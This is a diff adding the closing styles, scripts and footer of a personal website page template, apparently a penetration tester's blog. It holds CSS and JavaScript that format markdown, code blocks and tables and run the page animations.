+    .line-numbers-rows {
+        display: none !important;
+    }
+    
+    .line-numbers {
+        padding-left: 1rem !important;
+    }
+}
+
+/* Show line numbers only on mobile */
+@media (max-width: 640px) {
+    .line-numbers .line-numbers-rows {
+        border-right: none !important;
+    }
+
+    .line-numbers-rows > span:before {
+        color: rgba(74, 222, 128, 0.3) !important;
+    }
+}
+
+/* Topic separator line */
+.markdown-content hr {
+    border: 0;
+    height: 2px;
+    background: linear-gradient(to right, rgba(74, 222, 128, 0.05), rgba(74, 222, 128, 0.2), rgba(74, 222, 128, 0.05));
+    margin: 2rem 0;
+    border-radius: 1px;
+}
+
+.markdown-content :not(pre) > code {
+    border-radius: 0.25rem;
+    padding: 0.2rem 0.4rem;
+    background: rgba(55, 65, 81, 0.3);
+    font-size: 0.875em;
+    color: #4ade80;
+    word-break: break-word;
+}
+
+.markdown-content pre code {
+    background-color: transparent;
+    padding: 0;
+    font-size: inherit;
+}
+
+/* Command prompt styling */
+.markdown-content .command-prompt {
+    background: rgba(31, 41, 55, 0.7);
+    padding: 0.75rem;
+    border-radius: 0.5rem;
+    border: 1px solid rgba(74, 222, 128, 0.1);
+    margin: 1rem 0;
+    font-family: 'JetBrains Mono', monospace;
+    color: #4ade80;
+    display: block;
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch;
+    font-size: 0.875rem;
+}
+
+.markdown-content .command-prompt::before {
+    content: "$ ";
+    color: rgba(74, 222, 128, 0.5);
+}
+
+/* Terminal output styling */
+.markdown-content .terminal-output {
+    background: rgba(17, 24, 39, 0.7);
+    padding: 0.75rem;
+    border-radius: 0.5rem;
+    margin: 1rem 0;
+    font-family: 'JetBrains Mono', monospace;
+    color: #d1d5db;
+    white-space: pre-wrap;
+    display: block;
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch;
+    font-size: 0.875rem;
+}
+
+/* Additional markdown content styles */
+.markdown-content {
+    color: #e5e7eb;
+    line-height: 1.75;
+}
+
+.markdown-content h1,
+.markdown-content h2,
+.markdown-content h3,
+.markdown-content h4 {
+    color: #4ade80;
+    margin-top: 1.5rem;
+    margin-bottom: 1rem;
+    font-weight: 600;
+    position: relative;
+    padding-left: 1.25rem;
+}
+
+.markdown-content h1::before,
+.markdown-content h2::before,
+.markdown-content h3::before,
+.markdown-content h4::before {
+    content: "#";
+    position: absolute;
+    left: 0;
+    color: rgba(74, 222, 128, 0.5);
+}
+
+.markdown-content h1 { font-size: 1.75rem; }
+.markdown-content h2 { font-size: 1.5rem; }
+.markdown-content h3 { font-size: 1.25rem; }
+.markdown-content h4 { font-size: 1.125rem; }
+
+@media (min-width: 640px) {
+    .markdown-content h1 { font-size: 2.25rem; }
+    .markdown-content h2 { font-size: 1.875rem; }
+    .markdown-content h3 { font-size: 1.5rem; }
+    .markdown-content h4 { font-size: 1.25rem; }
+}
+
+.markdown-content p {
+    margin: 1rem 0;
+}
+
+.markdown-content a {
+    color: #4ade80;
+    text-decoration: none;
+    transition: all 0.2s;
+    border-bottom: 1px dashed rgba(74, 222, 128, 0.3);
+    word-break: break-word;
+}
+
+.markdown-content a:hover {
+    border-bottom-style: solid;
+    border-bottom-color: #4ade80;
+}
+
+/* Enhanced list styling */
+.markdown-content ol {
+    counter-reset: section;
+    list-style-type: none;
+    padding-left: 2rem;
+    margin: 1rem 0;
+}
+
+.markdown-content ol > li {
+    counter-increment: section;
+    position: relative;
+    margin: 0.75rem 0;
+    padding-left: 0.5rem;
+}
+
+.markdown-content ol > li::before {
+    content: counter(section) ".";
+    position: absolute;
+    left: -2rem;
+    width: 1.75rem;
+    text-align: right;
+    color: #4ade80;
+    font-weight: 500;
+}
+
+/* Images */
+.markdown-content img {
+    max-width: 100%;
+    height: auto;
+    border-radius: 0.5rem;
+    margin: 1rem 0;
+}
+
+/* Blockquotes */
+.markdown-content blockquote {
+    border-left: 3px solid #4ade80;
+    margin: 1rem 0;
+    padding: 0.5rem 0 0.5rem 1rem;
+    background: rgba(74, 222, 128, 0.05);
+    border-radius: 0 0.5rem 0.5rem 0;
+    font-style: italic;
+}
+
+/* Mobile optimizations */
+@media (max-width: 640px) {
+    .markdown-content {
+        font-size: 0.8125rem;
+        line-height: 1.5;
+    }
+
+    .markdown-content h1 { 
+        font-size: 1.25rem;
+        margin-top: 1rem;
+        margin-bottom: 0.625rem;
+        padding-left: 1rem;
+    }
+    
+    .markdown-content h2 { 
+        font-size: 1.125rem;
+        margin-top: 0.875rem;
+        margin-bottom: 0.625rem;
+        padding-left: 1rem;
+    }
+    
+    .markdown-content h3 { 
+        font-size: 1rem;
+        margin-top: 0.875rem;
+        margin-bottom: 0.5rem;
+        padding-left: 1rem;
+    }
+    
+    .markdown-content h4 { 
+        font-size: 0.9375rem;
+        margin-top: 0.875rem;
+        margin-bottom: 0.5rem;
+        padding-left: 1rem;
+    }
+
+    .markdown-content p {
+        margin: 0.625rem 0;
+        padding: 0 0.5rem;
+    }
+
+    .markdown-content pre[class*="language-"] {
+        margin: 0.625rem -0.5rem;
+        padding: 0.625rem;
+        border-radius: 0.375rem;
+        font-size: 0.75rem;
+    }
+
+    .markdown-content :not(pre) > code {
+        font-size: 0.75rem;
+        padding: 0.125rem 0.25rem;
+    }
+
+    .markdown-content .command-prompt,
+    .markdown-content .terminal-output {
+        margin: 0.625rem -0.5rem;
+        padding: 0.625rem;
+        font-size: 0.75rem;
+    }
+
+    .markdown-content blockquote {
+        margin: 0.625rem 0;
+        padding: 0.5rem 0.75rem;
+        font-size: 0.8125rem;
+    }
+
+    .markdown-content ol,
+    .markdown-content ul {
+        padding-left: 1.75rem;
+        margin: 0.625rem 0;
+        padding-right: 0.5rem;
+    }
+
+    .markdown-content ol > li,
+    .markdown-content ul > li {
+        margin: 0.375rem 0;
+        font-size: 0.8125rem;
+    }
+
+    .markdown-content ol > li::before {
+        left: -1.75rem;
+        width: 1.5rem;
+    }
+
+    .markdown-content img {
+        margin: 0.625rem -0.5rem;
+        max-width: calc(100% + 1rem);
+        border-radius: 0.375rem;
+    }
+
+    .markdown-content hr {
+        margin: 1.25rem 0;
+    }
+}
+
+/* Fix for mobile layout consistency */
+@media (max-width: 640px) {
+    body {
+        overflow-x: hidden;
+        width: 100%;
+        position: relative;
+    }
+
+    .glass {
+        width: 100vw;
+        max-width: 100%;
+        margin-left: -1rem;
+        margin-right: -1rem;
+        border-radius: 0;
+        padding-left: 1rem;
+        padding-right: 1rem;
+    }
+
+    .markdown-content {
+        width: 100%;
+        overflow-x: hidden;
+    }
+
+    /* Prevent horizontal scrolling on tables while maintaining functionality */
+    .markdown-content .table-wrapper {
+        margin-left: -1rem;
+        margin-right: -1rem;
+        padding-left: 1rem;
+        padding-right: 1rem;
+        width: calc(100% + 2rem);
+    }
+
+    .markdown-content table {
+        width: 100%;
+        min-width: 100%;
+    }
+
+    /* Fix image overflow */
+    .markdown-content img {
+        max-width: calc(100vw - 2rem);
+        margin-left: auto;
+        margin-right: auto;
+    }
+
+    /* Fix code block overflow */
+    .markdown-content pre[class*="language-"] {
+        max-width: calc(100vw - 2rem);
+        margin-left: -1rem;
+        margin-right: -1rem;
+        padding: 1rem;
+    }
+}
+
+/* Ensure consistent container width */
+.max-w-4xl {
+    max-width: min(100vw - 2rem, 56rem);
+}
+
+/* Fix navigation buttons on mobile */
+@media (max-width: 640px) {
+    .nav-button {
+        width: 100%;
+        justify-content: center;
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+    }
+}
+
+/* Prevent content overflow */
+.markdown-content {
+    overflow-wrap: break-word;
+    word-wrap: break-word;
+    word-break: break-word;
+    hyphens: auto;
+}
+
+/* Fix table scrolling on mobile */
+.table-wrapper {
+    position: relative;
+    width: 100%;
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch;
+}
+
+.table-wrapper::before,
+.table-wrapper::after {
+    content: '';
+    position: absolute;
+    top: 0;
+    bottom: 0;
+    width: 1rem;
+    pointer-events: none;
+    z-index: 1;
+}
+
+.table-wrapper::before {
+    left: 0;
+    background: linear-gradient(to right, rgba(26, 26, 26, 0.9), transparent);
+}
+
+.table-wrapper::after {
+    right: 0;
+    background: linear-gradient(to left, rgba(26, 26, 26, 0.9), transparent);
+}
+
+/* Ensure consistent spacing */
+.prose {
+    max-width: none !important;
+}
+
+/* Fix container padding */
+@media (max-width: 640px) {
+    .px-2 {
+        padding-left: 0.5rem !important;
+        padding-right: 0.5rem !important;
+    }
+}
+
+/* Image zoom functionality for mobile */
+.markdown-content img.zoomable {
+    cursor: zoom-in;
+    transition: transform 0.3s ease;
+}
+
+.markdown-content img.zoomable.zoomed {
+    cursor: zoom-out;
+    transform: scale(1.5);
+    z-index: 10;
+    position: relative;
+}
+
+@media (max-width: 640px) {
+    .markdown-content img.zoomable.zoomed {
+        transform: scale(1.2);
+    }
+}
+</style>
+
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+    // Initialize AOS with optimized settings
+    AOS.init({
+        duration: 600,
+        easing: 'cubic-bezier(0.16, 1, 0.3, 1)',
+        once: true,
+        mirror: false,
+        offset: 50
+    });
+
+    // Add line numbers to code blocks with optimized animation
+    document.querySelectorAll('pre').forEach((block) => {
+        block.classList.add('line-numbers');
+        block.style.transition = 'all 0.2s cubic-bezier(0.37, 0, 0.63, 1)';
+    });
+
+    // Convert shell code blocks to command prompts with quick transitions
+    document.querySelectorAll('code[class*="language-shell"]').forEach((block) => {
+        if (block.parentElement.tagName === 'PRE') {
+            const lines = block.textContent.split('\n');
+            const formattedLines = lines.map(line => {
+                if (line.trim().startsWith('$') || line.trim().startsWith('>')) {
+                    return `<span class="command-prompt">${line.trim().substring(2)}</span>`;
+                } else {
+                    return `<span class="terminal-output">${line}</span>`;
+                }
+            });
+            block.innerHTML = formattedLines.join('\n');
+        }
+    });
+
+    // Add optimized hover effects to code blocks
+    document.querySelectorAll('pre[class*="language-"]').forEach((block) => {
+        block.addEventListener('mouseenter', () => {
+            block.style.transform = 'translateY(-2px)';
+            block.style.borderColor = 'rgba(74, 222, 128, 0.3)';
+            block.style.boxShadow = '0 4px 20px rgba(74, 222, 128, 0.1)';
+        });
+        
+        block.addEventListener('mouseleave', () => {
+            block.style.transform = 'translateY(0)';
+            block.style.borderColor = 'rgba(74, 222, 128, 0.1)';
+            block.style.boxShadow = 'none';
+        });
+    });
+
+    // Initialize list item animations with optimized timing
+    const listItems = document.querySelectorAll('.markdown-content ul > li, .markdown-content ol > li');
+    listItems.forEach((item, index) => {
+        item.style.setProperty('--li-index', index);
+        item.style.transition = 'all 0.2s cubic-bezier(0.37, 0, 0.63, 1)';
+    });
+
+    // Add smooth page transitions
+    document.querySelectorAll('a').forEach(link => {
+        if (link.hostname === window.location.hostname) {
+            link.addEventListener('click', e => {
+                e.preventDefault();
+                document.body.style.opacity = '0';
+                document.body.style.transform = 'translateY(10px)';
+                document.body.style.transition = 'all 0.2s cubic-bezier(0.37, 0, 0.63, 1)';
+                
+                setTimeout(() => {
+                    window.location.href = link.href;
+                }, 200);
+            });
+        }
+    });
+
+    // Add table wrapper for better mobile scrolling
+    document.querySelectorAll('.markdown-content table').forEach(table => {
+        const wrapper = document.createElement('div');
+        wrapper.className = 'table-wrapper';
+        table.parentNode.insertBefore(wrapper, table);
+        wrapper.appendChild(table);
+
+        // Check if table needs horizontal scrolling
+        const checkOverflow = () => {
+            wrapper.classList.toggle('has-overflow', table.scrollWidth > wrapper.clientWidth);
+        };
+
+        // Check on load and resize
+        checkOverflow();
+        window.addEventListener('resize', checkOverflow);
+    });
+
+    // Optimize images for mobile
+    document.querySelectorAll('.markdown-content img').forEach(img => {
+        img.addEventListener('load', () => {
+            if (img.naturalWidth > img.clientWidth) {
+                img.classList.add('zoomable');
+                img.addEventListener('click', () => {
+                    img.classList.toggle('zoomed');
+                });
+            }
+        });
+    });
+});
+</script>
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="glass mt-16 py-8">
+        <div class="max-w-6xl mx-auto px-4">
+            <div class="flex flex-col md:flex-row justify-between items-center">
+                <div class="text-center md:text-left mb-4 md:mb-0">
+                    <p class="text-gray-400">&copy; 2025 Kaulik Makwana</p>
+                    <p class="text-sm text-gray-500 terminal-text">Cybersecurity Engineer & Penetration Tester</p>
+                </div>
+                
+            </div>
+        </div>
+    </footer>
+
+    <!-- AOS JS -->
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    
+    <!-- Custom JS -->
+    <script src="/assets/js/terminal-animation.js"></script>
+    <script src="/assets/js/markdown-viewer.js"></script>
+    
+    <!-- Initialize animations and interactions -->
+    <script>
+    document.addEventListener('DOMContentLoaded', () => {
+        // Initialize AOS
+        AOS.init({
+            duration: 800,
+            easing: 'ease-out',
+            once: false,
+            mirror: true
+        });
+
+        // Scroll Progress Indicator
+        window.addEventListener('scroll', () => {
+            const scrollIndicator = document.querySelector('.scroll-indicator');
+            const scrolled = (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100;
+            scrollIndicator.style.transform = `scaleX(${scrolled / 100})`;
+        });
+
+        // Mobile Menu Toggle
+        const menuButton = document.getElementById('menuButton');
+        const mobileNav = document.getElementById('mobileNav');
+        
+        if (menuButton && mobileNav) {
+            menuButton.addEventListener('click', () => {
+                menuButton.classList.toggle('active');
+                mobileNav.classList.toggle('active');
+            });
+
+            // Close menu when clicking outside
+            document.addEventListener('click', (e) => {
+                if (!menuButton.contains(e.target) && !mobileNav.contains(e.target)) {
+                    menuButton.classList.remove('active');
+                    mobileNav.classList.remove('active');
+                }
+            });
+
+            // Close menu when scrolling
+            let lastScroll = window.scrollY;
+            window.addEventListener('scroll', () => {
+                const currentScroll = window.scrollY;
+                if (Math.abs(currentScroll - lastScroll) > 10) {
+                    menuButton.classList.remove('active');
+                    mobileNav.classList.remove('active');
+                }
+                lastScroll = currentScroll;
+            });
+        }
+
+        // Add hover effect to cards
+        document.querySelectorAll('.glass').forEach(card => {
+            card.classList.add('card-hover');
+        });
+
+        // Add button animations
+        document.querySelectorAll('a[href], button').forEach(button => {
+            if (!button.classList.contains('menu-button')) {
+                button.classList.add('btn');
+            }
+        });
+
+        // Terminal typing effect
+        function typeWriter(element, text, speed = 50) {
+            let i = 0;
+            element.textContent = '';
+            function type() {
+                if (i < text.length) {
+                    element.textContent += text.charAt(i);
+                    i++;
+                    setTimeout(type, speed);
+                }
+            }
+            type();
+        }
+
+        // Apply typing effect to terminal text
+        document.querySelectorAll('.terminal-text').forEach(el => {
+            const originalText = el.textContent;
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        typeWriter(el, originalText);
+                        observer.unobserve(el);
+                    }
+                });
+            });
+            observer.observe(el);
+        });
+    });
+    </script>
+<script src="/assets/js/tab-ux.js"></script>
+</body>
+</html>
